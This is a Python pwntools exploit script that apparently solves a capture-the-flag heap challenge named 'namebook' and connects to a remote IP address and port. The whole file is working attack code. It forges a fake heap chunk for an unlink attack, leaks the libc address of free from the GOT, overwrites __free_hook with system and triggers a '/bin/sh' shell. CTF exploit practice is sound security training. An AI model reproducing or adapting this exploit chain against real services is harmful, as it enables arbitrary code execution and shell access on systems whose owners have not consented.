from pwn import *
from LibcSearcher import LibcSearcher

context.log_level = "debug"
# p = process("./namebook")
p = remote("118.24.3.214" , 12344)
elf = ELF("./namebook")

cmd = lambda c : p.sendlineafter(">" , str(c))

def add(index , content):
	cmd(1)
	p.sendlineafter("index:" , str(index))
	if len(content) != 0x100:
		p.sendlineafter("name:" , content)
	else:
		p.sendafter("name:" , content)

def delete(index):
	cmd(2)
	p.sendlineafter("index:" , str(index))

def show(index):
	cmd(3)
	p.sendlineafter("index:" , str(index))

def edit(index , content):
	cmd(4)
	p.sendlineafter("index:" , str(index))
	if len(content) != 0x100:
		p.sendlineafter("name:" , content)
	else:
		p.sendafter("name:" , content)

add(0 , "a")
add(1 , "b")
add(2 , "c")
add(3 , "d") 
add(4 , "f") # ptr[3]
add(5 , "g")
# unlink_fake_chunk
ptr = 0x602040
content = p64(0) + p64(0x81) + p64(ptr) + p64(ptr + 0x8)
content = content.ljust(0x80 , "a") + p64(0x80) + p64(0x90)
edit(3 , content )
# go
delete(4)
# step2
payload = "/bin/sh\x00" + p64(ptr) + p64(elf.got["free"]) + p64(ptr + 0x18)
edit(3 , payload)
show(2)
free_addr = u64(p.recvuntil("\x7f").ljust(8 , "\x00"))
log.success("free : " + hex(free_addr))
libc = LibcSearcher("free" , free_addr)
libc_base = free_addr - libc.dump("free")
free_hook = libc_base + libc.dump("__free_hook")
system = libc_base + libc.dump("system")

edit(3 , p64(free_hook))
edit(3 , p64(system))
delete(1)

p.interactive()